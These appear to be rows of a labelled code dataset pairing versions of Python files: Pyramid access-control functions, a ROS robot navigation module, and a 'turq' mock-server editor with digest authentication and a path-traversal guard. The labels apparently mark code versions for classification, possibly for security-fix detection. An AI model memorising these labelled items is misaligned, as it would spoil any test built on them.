    :returns: A pyramid acl list
    :rtype: list
    """"""
    acl = DEFAULT_PERM_NEW[:]
    acl.extend(_get_admin_status_acl(self))

    admin_perms = ()

    if self.status == 'valid' and self.paid_status != 'resulted':
        admin_perms += ('gencinv.invoice', 'add_payment.invoice',)

    if self.status == 'valid' and self.paid_status == 'waiting' \
            and not self.exported:
        admin_perms += ('set_date.invoice',)

    if not self.exported:
        admin_perms += ('set_treasury.invoice',)

    if admin_perms:
        acl.append((Allow, ""group:admin"", admin_perms))
        acl.append((Allow, ""group:manager"", admin_perms))

    if self.status != 'valid':
        acl.append((Allow, ""group:invoice_validation"", ('valid.invoice',)))
        acl.append((Deny, ""group:invoice_validation"", ('wait.invoice',)))

    if self.status == 'valid' and self.paid_status != 'resulted':
        acl.append((Allow, ""group:payment_admin"", ('add_payment.invoice',)))

    acl.extend(_get_user_status_acl(self))

    for user in self.company.employees:
        perms = ()
        if self.status == 'valid' and self.paid_status != 'resulted':
            perms += ('gencinv.invoice',)

        if perms:
            acl.append((Allow, user.login, perms))

    return acl


def get_cancelinvoice_default_acl(self):
    """"""
    Return the acl for cancelinvoices
    """"""
    acl = DEFAULT_PERM_NEW[:]
    acl.extend(_get_admin_status_acl(self))

    admin_perms = ()
    if not self.exported and self.status == 'valid':
        admin_perms += ('set_treasury.cancelinvoice', 'set_date.cancelinvoice')

    if admin_perms:
        acl.append((Allow, ""group:admin"", admin_perms))
        acl.append((Allow, ""group:manager"", admin_perms))

    if self.status != 'valid':
        acl.append(
            (Allow, ""group:invoice_validation"", ('valid.cancelinvoice',))
        )
        acl.append((Deny, ""group:invoice_validation"", ('wait.cancelinvoice',)))

    acl.extend(_get_user_status_acl(self))
    return acl


def get_task_line_group_acl(self):
    """"""
    Return the task line acl
    """"""
    return self.task.__acl__()


def get_task_line_acl(self):
    """"""
    Return the task line acl
    """"""
    return self.group.__acl__()


def get_discount_line_acl(self):
    """"""
    Return the acls for accessing the discount line
    """"""
    return self.task.__acl__()


def get_payment_line_acl(self):
    """"""
    Return the acls for accessing a payment line
    """"""
    return self.task.__acl__()


def get_expense_sheet_default_acl(self):
    """"""
    Compute the expense Sheet acl

    view
    edit
    add_payment

    wait
    valid
    invalid
    delete

    add.file
    edit.file
    view.file

    :returns: Pyramid acl
    :rtype: list
    """"""
    acl = DEFAULT_PERM_NEW[:]
    acl.extend(_get_admin_status_acl(self))

    admin_perms = ()
    if not self.exported:
        admin_perms += ('set_treasury.expensesheet',)

    if self.status == 'valid' and self.paid_status != 'resulted':
        admin_perms += ('add_payment.expensesheet',)

    if admin_perms:
        acl.append((Allow, ""group:admin"", admin_perms))
        acl.append((Allow, ""group:manager"", admin_perms))

    acl.extend(_get_user_status_acl(self))

    return acl


def get_payment_default_acl(self):
    """"""
    Compute the acl for a Payment object

    view
    edit
    """"""
    acl = DEFAULT_PERM_NEW[:]

    admin_perms = ('view.payment',)
    if not self.exported:
        admin_perms += ('edit.payment',)

    acl.append((Allow, 'group:admin', admin_perms))
    acl.append((Allow, 'group:manager', admin_perms))
    acl.append((Allow, 'group:payment_admin', admin_perms))

    for user in self.task.company.employees:
        acl.append((Allow, user.login, ('view.payment',)))

    return acl


def get_expense_payment_acl(self):
    """"""
    Compute the acl for an Expense Payment object

    view
    edit
    """"""
    acl = DEFAULT_PERM_NEW[:]
    admin_perms = ('view.expensesheet_payment',)
    if not self.exported:
        admin_perms += ('edit.expensesheet_payment',)

    acl.append((Allow, 'group:admin', admin_perms))
    acl.append((Allow, 'group:manager', admin_perms))

    for user in self.task.company.employees:
        acl.append((Allow, user.login, ('view.expensesheet_payment',)))

    return acl


def get_customer_acl(self):
    """"""
    Compute the customer's acl
    """"""
    acl = DEFAULT_PERM[:]
    for user in self.company.employees:
        acl.append(
            (Allow, user.login, ('view_customer', 'edit_customer',))
        )
    return acl


def get_phase_acl(self):
    """"""
    Return acl for a phase
    """"""
    return get_project_acl(self.project)


def get_project_acl(self):
    """"""
    Return acl for a project
    """"""
    acl = DEFAULT_PERM[:]
    for user in self.company.employees:
        acl.append(
            (
                Allow,
                user.login,
                (
                    'view_project',
                    'edit_project',
                    'add_project',
                    'edit_phase',
                    'add_phase',
                    'add_estimation',
                    'add_invoice',
                    'list_estimations',
                    'list_invoices',
                    'view.file',
                    'add.file',
                    'edit.file',
                )
            )
        )

    return acl


def get_file_acl(self):
    """"""
    Compute the acl for a file object
    a file object's acl are simply the parent's
    """"""
    if self.parent is not None:
        return self.parent.__acl__
    # Exceptions: headers and logos are not attached throught the Node's parent
    # rel
    elif self.company_header_backref is not None:
        return self.company_header_backref.__acl__
    elif self.company_logo_backref is not None:
        return self.company_logo_backref.__acl__
    else:
        return []


def get_product_acl(self):
    """"""
    Return the acl for a product : A product's acl is given by its category
    """"""
    acl = DEFAULT_PERM[:]
    for user in self.company.employees:
        acl.append(
            (
                Allow,
                user.login,
                (
                    'list_sale_products',
                    'view_sale_product',
                    'edit_sale_product',
                )
            )
        )
    return acl


def get_competence_acl(self):
    """"""
    Return acl for the Competence Grids objects
    """"""
    acl = DEFAULT_PERM[:]
    login = self.contractor.login
    acl.append(
        (
            Allow,
            u'%s' % login,
            (
                ""view_competence"",
                ""edit_competence""
            )
        )
    )
    return acl


def set_models_acl():
    """"""
    Add acl to the db objects used as context

    Here acl are set globally, but we'd like to set things more dynamically
    when different roles will be implemented
    """"""
    Activity.__default_acl__ = property(get_activity_acl)
    CancelInvoice.__default_acl__ = property(get_cancelinvoice_default_acl)
    Company.__default_acl__ = property(get_company_acl)
    CompetenceGrid.__acl__ = property(get_competence_acl)
    CompetenceGridItem.__acl__ = property(get_competence_acl)
    CompetenceGridSubItem.__acl__ = property(get_competence_acl)
    ConfigFiles.__default_acl__ = [(Allow, Everyone, 'view'), ]
    Customer.__default_acl__ = property(get_customer_acl)
    DiscountLine.__acl__ = property(get_discount_line_acl)
    Estimation.__default_acl__ = property(get_estimation_default_acl)
    ExpenseSheet.__default_acl__ = property(get_expense_sheet_default_acl)
    ExpensePayment.__default_acl__ = property(get_expense_payment_acl)
    File.__default_acl__ = property(get_file_acl)
    Invoice.__default_acl__ = property(get_invoice_default_acl)
    Job.__default_acl__ = DEFAULT_PERM[:]
    Payment.__default_acl__ = property(get_payment_default_acl)
    PaymentLine.__acl__ = property(get_payment_line_acl)
    Phase.__acl__ = property(get_phase_acl)
    Project.__default_acl__ = property(get_project_acl)
    SaleProductCategory.__acl__ = property(get_product_acl)
    SaleProduct.__acl__ = property(get_product_acl)
    SaleProductGroup.__acl__ = property(get_product_acl)
    StatisticSheet.__acl__ = property(get_base_acl)
    StatisticEntry.__acl__ = property(get_base_acl)
    BaseStatisticCriterion.__acl__ = property(get_base_acl)
    TaskLine.__acl__ = property(get_task_line_acl)
    TaskLineGroup.__acl__ = property(get_task_line_group_acl)
    Template.__default_acl__ = property(get_base_acl)
    TemplatingHistory.__default_acl__ = property(get_base_acl)
    Timeslot.__default_acl__ = property(get_base_acl)
    User.__default_acl__ = property(get_user_acl)
    UserDatas.__default_acl__ = property(get_userdatas_acl)
    Workshop.__default_acl__ = property(get_event_acl)

    Tva.__acl__ = property(get_base_acl)
    ExpenseType.__acl__ = property(get_base_acl)
    ExpenseKmType.__acl__ = property(get_base_acl)
    ExpenseTelType.__acl__ = property(get_base_acl)
/n/n/n",1
124,9725ca3005f492cb5c10e7ba0cce29ed76f57daa,"navloc.py/n/n"""""" Navigation and localization
    
Author:
    Annaleah Ernst
""""""
import tf
import rospy
import numpy as np

from copy import deepcopy
from geometry_msgs.msg import Pose, Point, Quaternion
from math import sin, cos, pi
from time import time

from localization import Localization
from logger import Logger
from navigation import Navigation

class NavLoc(Navigation, Localization):
    """""" Navigate and localize on a map.
    
    Args:
        point_ids (set): Unique identifier for each waypoint in the graph.
        locations (dict): Point_ids mapped to tuples representing locations.
        neighbors (dict): Point_ids mapped to lists containing other point_ids representing 
            the current node's neighbors.
        landmark_ids (set): Unique identifier for each landmark in the graph.
        landmark_positions (dict): Map AprilTag landmark ids to their absolute
            position on the floorplan.
        landmark_angles (dict): Map AprilTag landmark ids to their absolute
            position on the floorplan. This specifies the angle of rotation of the landmark in the 
            xy plane; ie, how much has its horizontal vector deviated from the x axis.
        jerky (bool, optional): If true, robot will not decelerate, but stop abruptly.
            Defaults to False.
        walking_speed (float, optional): Percentage of maximum speed, magnitude between 0 and 1.
                Values with magnitude greater than 1 will be ignored.
    
    Attributes:
        tags (geometry_msgs.msg.PoseStamped dict): A dict of all the AprilTags currently in view in 
            their raw form.
        tags_odom (geometry_msgs.msg.PoseStamped dict): Same as above, but in the odometry frame.
        floorplan (FloorPlan): The map of the current space as a floorplan.
        p (geometry_msgs.msg.Point): The position of the robot in the ekf odometry frame according to
            the robot_pose_ekf package.
        q (geometry_msgs.msg.Quaternion): The orientation of the robot in the ekf odometry frame
            according the the robot_pose_ekf package.
        angle (float): The angle (in radians) that the robot is from 0 in the ekf odometry frame. 
            Between -pi and pi
        map_pos (geometry_msgs.msg.Point): The position of the robot in the map frame.
        map_angle (float): The angle (in radians) of the robot in the map frame.
    """"""
    
    def __init__(self, point_ids, locations, neighbors, landmark_ids, landmark_positions, landmark_angles, jerky = False, walking_speed = 1):
        
        # create map position
        self.map_pos = Point()
        self.map_angle = 0
        
        # create a path variable so that we can navigate via waypoints
        self._path = None
    
        # initialize what we're inheriting from
        Localization.__init__(self, point_ids, locations, neighbors, landmark_ids, landmark_positions, landmark_angles)
        Navigation.__init__(self, jerky = jerky, walking_speed = walking_speed)

        self._logger = Logger(""NavLoc"")
    
        # give ourselves a second to see if there's a nearby AR tag
        timer = time()
        while time() - timer < 0.5:
            pass
    
    def _ekfCallback(self, data):
        """""" Process robot_pose_ekf data. """"""
        
        # get the ekf data
        Navigation._ekfCallback(self, data)
        
        # compute map data
        self.map_pos = self.transformPoint(self.p, ""odom"", ""map"")
        self.map_angle = self.transformAngle(self.angle, ""odom"", ""map"")
    
    def _handleObstacle(self, turn_delta):
        """""" Handle obstacle and reset path if necessary. """"""
        
        if Navigation._handleObstacle(self, turn_delta):
            self._path = None
            return True
            
        return False
    
    def goToOrientation(self, angle):
        """""" Go to orientation in the map frame. """"""
        return Navigation.goToOrientation(self, self.transformAngle(angle, ""map"", ""odom""))
    
    def takePathToDest(self, x, y):
        """""" Go the target pos via waypoints from the floorplan. 
        
        Args:
            x (float): The destination x coord in the map frame.
            y (float): The destination y coord in the map frame.
        """"""
        
        # we currently aren't on a mission, or we've been interrupted
        if self._path is None:
            self._path = self.floorplan.getShortestPath(self.map_pos, Point(x,y,0))
        
        # we've arrived a waypoint on our path to destination
        if self.goToPosition(self._path[0].x, self._path[0].y):
            self._logger.info(""Arrived at waypoint "" + str((self._path[0].x, self._path[0].y)) + "" (map position is "" +
                str((self.map_pos.x, self.map_pos.y)) + "")"")
            self._path.pop(0)
            
        # we've cleared out the traversal path, so we've reached our goal
        if self._path == []:
            self._path = None
            self._logger.debug(""no path!"")
            return True
        
        # we're still on our way to the destination
        return False
    
    def goToPosition(self, x, y):
        """""" Go to position x, y, in the map frame""""""
        transformed_point = self.transformPoint(Point(x, y, 0), ""map"", ""odom"")
        return Navigation.goToPosition(self, transformed_point.x, transformed_point.y)

    def csvLogArrival(self, test_name, x, y, folder = ""tests""):
        """""" Log the arrival of the robot at a waypoint. """"""
        
        self._logger.csv(test_name + ""_waypoints"", [""X_target"", ""Y_target"", ""X_map"", ""Y_map"", ""X_ekf"", ""Y_ekf""],
                    [x, y, self.map_pos.x, self.map_pos.y, self.p.x, self.p.y],
                    folder = folder)

    def csvLogMap(self, test_name, folder = ""tests""):
        """""" Log map position data. """"""
         
        self._logger.csv(test_name + ""_mappose"", [""X"", ""Y"", ""yaw""], [self.map_pos.x, self.map_pos.y, self.map_angle], folder = folder)

if __name__ == ""__main__"":
    import MD2
    from tester import Tester
    from math import pi
    
    class NavLocTest(Tester):
        """""" Run local navigation tests. """"""
        def __init__(self):
            Tester.__init__(self, ""NavLoc"")
            
            # flag for a jerky stop
            self.jerky = False
            
            # I'm a bit concerned about robot safety if we don't slow things down,
            # but I'm also worried it won't be an accurate test if we change the speed
            self.walking_speed = 1 # if not self.jerky else .5
            
            # linear test
            self.reached_goal = False
            
            # square test
            self.reached_corner = [False, False, False, False]
            self.cc_square = [(0,0), (1,0), (1,1), (0,1)]
            self.c_square = [(0,0), (1,0), (1,-1), (0, -1)]
            self.corner_counter = 0
        
            # set up the logger output file
            self.test_name = ""path""
        
            # set up points on map
            point_ids = MD2.points
            locations = MD2.locations
            neighbors = MD2.neighbors
        
            # set map location of the landmark
            landmarks = MD2.landmarks
            landmark_positions = MD2.landmark_pos
            landmark_orientations = MD2.landmark_orient
        
            self.navloc = NavLoc(point_ids, locations, neighbors,landmarks, landmark_positions, landmark_orientations, jerky = self.jerky, walking_speed = self.walking_speed)
        
            # set the destinations
            self.destination = [self.navloc.floorplan.graph['T'].location, self.navloc.floorplan.graph['R'].location]

        def main(self):
            """""" The test currently being run. """"""
            #self.testCCsquare(1)
            #self.testCsquare(1)
            #self.testLine(1.5)
            self.testPath()
            self.navloc.csvLogEKF(self.test_name)
            self.navloc.csvLogMap(self.test_name)
            self.navloc.csvLogTransform(self.test_name)
            self.navloc.csvLogRawTags(self.test_name)
            self.navloc.csvLogOdomTags(self.test_name)
            #self.navloc.takePathToDest(1.5,0)

        def initFile(self, filename):
            """""" Write the first line of our outgoing file (variable names). """"""
            self.test_name = filename + (""jerky"" if self.jerky else ""smooth"")
        
        def logArrival(self, name, x, y):
            self.logger.info(""Arrived at "" + str((x, y)) + "" (map position is "" +
                str((self.navloc.map_pos.x, self.navloc.map_pos.y)) + "")"")
            self.navloc.csvLogArrival(self.test_name, x, y)
            
        def testPath(self):
            """""" Attempt to navigation between two offices""""""
            if not self.reached_corner[0]:
                self.reached_corner[0] = self.navloc.takePathToDest(self.destination[0].x, self.destination[0].y)
                if self.reached_corner[0]:
                    self.logArrival(""office 1"", self.destination[0].x, self.destination[0].y)
                    
            elif self.navloc.takePathToDest(self.destination[1].x, self.destination[1].y):
                self.reached_corner[0] = False
                self.logArrival(""office 2"", self.destination[1].x, self.destination[1].y)
        
        def testLine(self, length):
            """""" Test behavior with a simple line. 
            
            Args:
                length (float): Length of the desired line (in meters).
            """"""
            if self.test_name is None:
                self.initFile(""line"")
            
            if not self.reached_corner[0]:
                self.reached_corner[0] = self.navloc.goToPosition(0, 0)
                if self.reached_corner[0]:
                    self.logArrival(""home"", 0, 0)
        
            elif self.navloc.goToPosition(length, 0):
                self.reached_corner[0] = False
                self.logArrival(""endpoint"", length, 0)
    
        def testCCsquare(self, length):
            """""" Test a counter clockwise square. 
            
            Args:
                length (float): Length of the desired line (in meters).
            """"""
            if self.test_name is None:
                self.initFile(""counterclockwise"")
            
            self.testSquare(length, self.cc_square)
        
        def testCsquare(self, length):
            """""" Test a clockwise square. 
            
            Args:
                length (float): Length of the desired line (in meters).
            """"""
            if self.test_name is None:
                self.initFile(""clockwise"")
            
            self.testSquare(length, self.c_square)
    
        def testSquare(self, length, corners):
            """""" Test behavior with a simple square. 
            
            Args:
                length (float): Length of the sides of the square (in meters).
            """"""
            # test a simple square
            if not self.reached_corner[self.corner_counter]:
                self.reached_corner[self.corner_counter] = self.navloc.goToPosition(corners[self.corner_counter][0]*length, corners[self.corner_counter][1]*length)
            
            else:
                self.logArrival(""corner "" + str(self.corner_counter), corners[self.corner_counter][0]*length, corners[self.corner_counter][1]*length)
                if self.corner_counter == len(self.reached_corner) - 1:
                    self.reached_corner = [False] * len(self.reached_corner)
                self.corner_counter = (self.corner_counter + 1) % len(self.reached_corner)
    
        def shutdown(self):
            """""" Kill all behavioral test processes. """"""
            self.navloc.shutdown(self.rate)
            Tester.shutdown(self)
        
    NavLocTest().run()/n/n/n",0
125,9725ca3005f492cb5c10e7ba0cce29ed76f57daa,"/navloc.py/n/n"""""" Navigation and localization
    
Author:
    Annaleah Ernst
""""""
import tf
import rospy
import numpy as np

from copy import deepcopy
from geometry_msgs.msg import Pose, Point, Quaternion
from math import sin, cos, pi
from time import time

from localization import Localization
from logger import Logger
from navigation import Navigation

class NavLoc(Navigation, Localization):
    """""" Navigate and localize on a map.
    
    Args:
        point_ids (set): Unique identifier for each waypoint in the graph.
        locations (dict): Point_ids mapped to tuples representing locations.
        neighbors (dict): Point_ids mapped to lists containing other point_ids representing 
            the current node's neighbors.
        landmark_ids (set): Unique identifier for each landmark in the graph.
        landmark_positions (dict): Map AprilTag landmark ids to their absolute
            position on the floorplan.
        landmark_angles (dict): Map AprilTag landmark ids to their absolute
            position on the floorplan. This specifies the angle of rotation of the landmark in the 
            xy plane; ie, how much has its horizontal vector deviated from the x axis.
        jerky (bool, optional): If true, robot will not decelerate, but stop abruptly.
            Defaults to False.
        walking_speed (float, optional): Percentage of maximum speed, magnitude between 0 and 1.
                Values with magnitude greater than 1 will be ignored.
    
    Attributes:
        tags (geometry_msgs.msg.PoseStamped dict): A dict of all the AprilTags currently in view in 
            their raw form.
        tags_odom (geometry_msgs.msg.PoseStamped dict): Same as above, but in the odometry frame.
        floorplan (FloorPlan): The map of the current space as a floorplan.
        p (geometry_msgs.msg.Point): The position of the robot in the ekf odometry frame according to
            the robot_pose_ekf package.
        q (geometry_msgs.msg.Quaternion): The orientation of the robot in the ekf odometry frame
            according the the robot_pose_ekf package.
        angle (float): The angle (in radians) that the robot is from 0 in the ekf odometry frame. 
            Between -pi and pi
        map_pos (geometry_msgs.msg.Point): The position of the robot in the map frame.
        map_angle (float): The angle (in radians) of the robot in the map frame.
    """"""
    
    def __init__(self, point_ids, locations, neighbors, landmark_ids, landmark_positions, landmark_angles, jerky = False, walking_speed = 1):
        
        # create map position
        self.map_pos = Point()
        self.map_angle = 0
        
        # create a path variable so that we can navigate via waypoints
        self._path = None
    
        # initialize what we're inheriting from
        Localization.__init__(self, point_ids, locations, neighbors, landmark_ids, landmark_positions, landmark_angles)
        Navigation.__init__(self, jerky = jerky, walking_speed = walking_speed)

        self._logger = Logger(""NavLoc"")
    
        # give ourselves a second to see if there's a nearby AR tag
        timer = time()
        while time() - timer < 0.5:
            pass
    
    def _ekfCallback(self, data):
        """""" Process robot_pose_ekf data. """"""
        
        # get the ekf data
        Navigation._ekfCallback(self, data)
        
        # compute map data
        self.map_pos = self.transformPoint(self.p, ""odom"", ""map"")
        self.map_angle = self.transformAngle(self.angle, ""odom"", ""map"")
    
    def _handleObstacle(self, turn_delta):
        """""" Handle obstacle and reset path if necessary. """"""
        
        if Navigation._handleObstacle(self, turn_delta):
            self._path = None
            return True
            
        return False
    
    def goToOrientation(self, angle):
        """""" Go to orientation in the map frame. """"""
        return Navigation.goToOrientation(self, self.transformAngle(angle, ""map"", ""odom""))
    
    def takePathToDest(self, x, y):
        """""" Go the target pos via waypoints from the floorplan. 
        
        Args:
            x (float): The destination x coord in the map frame.
            y (float): The destination y coord in the map frame.
        """"""
        
        # we currently aren't on a mission, or we've been interrupted
        if self._path is None:
            self._path = self.floorplan.getShortestPath(self.map_pos, Point(x,y,0))
        
        # we've arrived a waypoint on our path to destination
        if self.goToPosition(self._path[0].x, self._path[0].y):
            self._logger.info(""Arrived at waypoint "" + str((self._path[0].x, self._path[0].y)) + "" (map position is "" +
                str((self.map_pos.x, self.map_pos.y)) + "")"")
            self._path.pop(0)
            
        # we've cleared out the traversal path, so we've reached our goal
        if not self._path:
            self._path = None
            self._logger.debug(""no path!"")
            return True
        
        # we're still on our way to the destination
        return False
    
    def goToPosition(self, x, y):
        """""" Go to position x, y, in the map frame""""""
        transformed_point = self.transformPoint(Point(x, y, 0), ""map"", ""odom"")
        return Navigation.goToPosition(self, transformed_point.x, transformed_point.y)

    def csvLogArrival(self, test_name, x, y, folder = ""tests""):
        """""" Log the arrival of the robot at a waypoint. """"""
        
        self._logger.csv(test_name + ""_waypoints"", [""X_target"", ""Y_target"", ""X_map"", ""Y_map"", ""X_ekf"", ""Y_ekf""],
                    [x, y, self.map_pos.x, self.map_pos.y, self.p.x, self.p.y],
                    folder = folder)

    def csvLogMap(self, test_name, folder = ""tests""):
        """""" Log map position data. """"""
         
        self._logger.csv(test_name + ""_mappose"", [""X"", ""Y"", ""yaw""], [self.map_pos.x, self.map_pos.y, self.map_angle], folder = folder)

if __name__ == ""__main__"":
    import MD2
    from tester import Tester
    from math import pi
    
    class NavLocTest(Tester):
        """""" Run local navigation tests. """"""
        def __init__(self):
            Tester.__init__(self, ""NavLoc"")
            
            # flag for a jerky stop
            self.jerky = False
            
            # I'm a bit concerned about robot safety if we don't slow things down,
            # but I'm also worried it won't be an accurate test if we change the speed
            self.walking_speed = 1 # if not self.jerky else .5
            
            # linear test
            self.reached_goal = False
            
            # square test
            self.reached_corner = [False, False, False, False]
            self.cc_square = [(0,0), (1,0), (1,1), (0,1)]
            self.c_square = [(0,0), (1,0), (1,-1), (0, -1)]
            self.corner_counter = 0
        
            # set up the logger output file
            self.test_name = ""path""
        
            # set up points on map
            point_ids = MD2.points
            locations = MD2.locations
            neighbors = MD2.neighbors
        
            # set map location of the landmark
            landmarks = MD2.landmarks
            landmark_positions = MD2.landmark_pos
            landmark_orientations = MD2.landmark_orient
        
            self.navloc = NavLoc(point_ids, locations, neighbors,landmarks, landmark_positions, landmark_orientations, jerky = self.jerky, walking_speed = self.walking_speed)
        
            # set the destinations
            self.destination = [self.navloc.floorplan.graph['T'].location, self.navloc.floorplan.graph['R'].location]

        def main(self):
            """""" The test currently being run. """"""
            #self.testCCsquare(1)
            #self.testCsquare(1)
            #self.testLine(1.5)
            self.testPath()
            self.navloc.csvLogEKF(self.test_name)
            self.navloc.csvLogMap(self.test_name)
            self.navloc.csvLogTransform(self.test_name)
            self.navloc.csvLogRawTags(self.test_name)
            self.navloc.csvLogOdomTags(self.test_name)
            #self.navloc.takePathToDest(1.5,0)

        def initFile(self, filename):
            """""" Write the first line of our outgoing file (variable names). """"""
            self.test_name = filename + (""jerky"" if self.jerky else ""smooth"")
        
        def logArrival(self, name, x, y):
            self.logger.info(""Arrived at "" + str((x, y)) + "" (map position is "" +
                str((self.navloc.map_pos.x, self.navloc.map_pos.y)) + "")"")
            self.navloc.csvLogArrival(self.test_name, x, y)
            
        def testPath(self):
            """""" Attempt to navigation between two offices""""""
            if not self.reached_corner[0]:
                self.reached_corner[0] = self.navloc.takePathToDest(self.destination[0].x, self.destination[0].y)
                if self.reached_corner[0]:
                    self.logArrival(""office 1"", self.destination[0].x, self.destination[0].y)
                    
            elif self.navloc.takePathToDest(self.destination[1].x, self.destination[1].y):
                self.reached_corner[0] = False
                self.logArrival(""office 2"", self.destination[1].x, self.destination[1].y)
        
        def testLine(self, length):
            """""" Test behavior with a simple line. 
            
            Args:
                length (float): Length of the desired line (in meters).
            """"""
            if self.test_name is None:
                self.initFile(""line"")
            
            if not self.reached_corner[0]:
                self.reached_corner[0] = self.navloc.goToPosition(0, 0)
                if self.reached_corner[0]:
                    self.logArrival(""home"", 0, 0)
        
            elif self.navloc.goToPosition(length, 0):
                self.reached_corner[0] = False
                self.logArrival(""endpoint"", length, 0)
    
        def testCCsquare(self, length):
            """""" Test a counter clockwise square. 
            
            Args:
                length (float): Length of the desired line (in meters).
            """"""
            if self.test_name is None:
                self.initFile(""counterclockwise"")
            
            self.testSquare(length, self.cc_square)
        
        def testCsquare(self, length):
            """""" Test a clockwise square. 
            
            Args:
                length (float): Length of the desired line (in meters).
            """"""
            if self.test_name is None:
                self.initFile(""clockwise"")
            
            self.testSquare(length, self.c_square)
    
        def testSquare(self, length, corners):
            """""" Test behavior with a simple square. 
            
            Args:
                length (float): Length of the sides of the square (in meters).
            """"""
            # test a simple square
            if not self.reached_corner[self.corner_counter]:
                self.reached_corner[self.corner_counter] = self.navloc.goToPosition(corners[self.corner_counter][0]*length, corners[self.corner_counter][1]*length)
            
            else:
                self.logArrival(""corner "" + str(self.corner_counter), corners[self.corner_counter][0]*length, corners[self.corner_counter][1]*length)
                if self.corner_counter == len(self.reached_corner) - 1:
                    self.reached_corner = [False] * len(self.reached_corner)
                self.corner_counter = (self.corner_counter + 1) % len(self.reached_corner)
    
        def shutdown(self):
            """""" Kill all behavioral test processes. """"""
            self.navloc.shutdown(self.rate)
            Tester.shutdown(self)
        
    NavLocTest().run()/n/n/n",1
126,ea542c6de53cd5ea1c4b475ed4901814365ba461,"turq/editor.py/n/n# pylint: disable=unused-argument

import base64
import hashlib
import html
import mimetypes
import os
import pkgutil
import posixpath
import socket
import socketserver
import string
import threading
import wsgiref.simple_server

import falcon
import werkzeug.formparser

import turq.examples
from turq.util.http import guess_external_url


STATIC_PREFIX = '/static/'


def make_server(host, port, ipv6, password, mock_server):
    editor = falcon.API(media_type='text/plain; charset=utf-8',
                        # This server is very volatile: who knows what will be
                        # listening on this host and port tomorrow? So, disable
                        # caching completely. We don't want Chrome to prompt
                        # to ""Show saved copy"" when Turq is not running, etc.
                        middleware=[DisableCache()])
    # Microsoft Edge doesn't send ``Authorization: Digest`` to ``/``.
    # Can be circumvented with ``/?``, but I think ``/editor`` is better.
    editor.add_route('/editor', EditorResource(mock_server, password))
    editor.add_route('/', RedirectResource())
    editor.add_sink(static_file, STATIC_PREFIX)
    editor.set_error_serializer(text_error_serializer)
    return wsgiref.simple_server.make_server(
        host, port, editor,
        IPv6EditorServer if ipv6 else EditorServer,
        EditorHandler)


def text_error_serializer(req, resp, exc):
    resp.body = exc.title


class EditorServer(socketserver.ThreadingMixIn,
                   wsgiref.simple_server.WSGIServer):

    address_family = socket.AF_INET
    allow_reuse_address = True
    daemon_threads = True

    def handle_error(self, request, client_address):
        # Do not print tracebacks.
        pass


class IPv6EditorServer(EditorServer):

    address_family = socket.AF_INET6


class EditorHandler(wsgiref.simple_server.WSGIRequestHandler):

    def log_message(self, *args):       # Do not log requests and responses.
        pass


class EditorResource:

    realm = 'Turq editor'
    template = string.Template(
        pkgutil.get_data('turq', 'editor/editor.html.tpl').decode('utf-8'))

    def __init__(self, mock_server, password):
        self.mock_server = mock_server
        self.password = password
        self.nonce = self.new_nonce()
        self._lock = threading.Lock()

    def on_get(self, req, resp):
        self.check_auth(req)
        resp.content_type = 'text/html; charset=utf-8'
        (mock_host, mock_port, *_) = self.mock_server.server_address
        resp.body = self.template.substitute(
            mock_host=html.escape(mock_host), mock_port=mock_port,
            mock_url=html.escape(guess_external_url(mock_host, mock_port)),
            rules=html.escape(self.mock_server.rules),
            examples=turq.examples.load_html(initial_header_level=3))

    def on_post(self, req, resp):
        self.check_auth(req)
        # Need `werkzeug.formparser` because JavaScript sends ``FormData``,
        # which is encoded as multipart.
        (_, form, _) = werkzeug.formparser.parse_form_data(req.env)
        if 'rules' not in form:
            raise falcon.HTTPBadRequest('Bad form')
        try:
            self.mock_server.install_rules(form['rules'])
        except SyntaxError as exc:
            resp.status = falcon.HTTP_422   # Unprocessable Entity
            resp.body = str(exc)
        else:
            resp.status = falcon.HTTP_303   # See Other
            resp.location = '/editor'
            resp.body = 'Rules installed successfully.'

    # We use HTTP digest authentication here, which provides a fairly high
    # level of protection. We use only one-time nonces, so replay attacks
    # should not be possible. An active man-in-the-middle could still intercept
    # a request and substitute their own rules; the ``auth-int`` option
    # is supposed to protect against that, but Chrome and Firefox (at least)
    # don't seem to support it.

    def check_auth(self, req):
        if not self.password:
            return
        auth = werkzeug.http.parse_authorization_header(req.auth)
        password_ok = False
        if self.check_password(req, auth):
            password_ok = True
            with self._lock:
                if auth.nonce == self.nonce:
                    self.nonce = self.new_nonce()
                    return
        raise falcon.HTTPUnauthorized(headers={
            'WWW-Authenticate':
                'Digest realm=""%s"", qop=""auth"", charset=UTF-8, '
                'nonce=""%s"", stale=%s' %
                (self.realm, self.nonce, 'true' if password_ok else 'false')})

    def check_password(self, req, auth):
        if not auth:
            return False
        a1 = '%s:%s:%s' % (auth.username, self.realm, self.password)
        a2 = '%s:%s' % (req.method, auth.uri)
        response = self.h('%s:%s:%s:%s:%s:%s' % (self.h(a1),
                                                 auth.nonce, auth.nc,
                                                 auth.cnonce, auth.qop,
                                                 self.h(a2)))
        return auth.response == response

    @staticmethod
    def h(s):               # pylint: disable=invalid-name
        return hashlib.md5(s.encode('utf-8')).hexdigest().lower()

    @staticmethod
    def new_nonce():
        return base64.b64encode(os.urandom(18)).decode()


class RedirectResource:

    def on_get(self, req, resp):
        raise falcon.HTTPFound('/editor')

    on_post = on_get


def static_file(req, resp):
    path = '/' + req.path[len(STATIC_PREFIX):]
    path = posixpath.normpath(path)           # Avoid path traversal
    try:
        resp.data = pkgutil.get_data('turq', 'editor%s' % path)
    except FileNotFoundError:
        raise falcon.HTTPNotFound()
    else:
        (resp.content_type, _) = mimetypes.guess_type(path)


class DisableCache:

    def process_response(self, req, resp, resource, req_succeeded):
        resp.cache_control = ['no-store']
/n/n/n",0
127,ea542c6de53cd5ea1c4b475ed4901814365ba461,"/turq/editor.py/n/n# pylint: disable=unused-argument

import base64
import hashlib
import html
import mimetypes
import os
import pkgutil
import socket
import socketserver
import string
import threading
import urllib.parse
import wsgiref.simple_server

import falcon
import werkzeug.formparser

import turq.examples
from turq.util.http import guess_external_url


STATIC_PREFIX = '/static/'


def make_server(host, port, ipv6, password, mock_server):
    editor = falcon.API(media_type='text/plain; charset=utf-8',
                        # This server is very volatile: who knows what will be
                        # listening on this host and port tomorrow? So, disable
                        # caching completely. We don't want Chrome to prompt
                        # to ""Show saved copy"" when Turq is not running, etc.
                        middleware=[DisableCache()])
    # Microsoft Edge doesn't send ``Authorization: Digest`` to ``/``.
    # Can be circumvented with ``/?``, but I think ``/editor`` is better.
    editor.add_route('/editor', EditorResource(mock_server, password))
    editor.add_route('/', RedirectResource())
    editor.add_sink(static_file, STATIC_PREFIX)
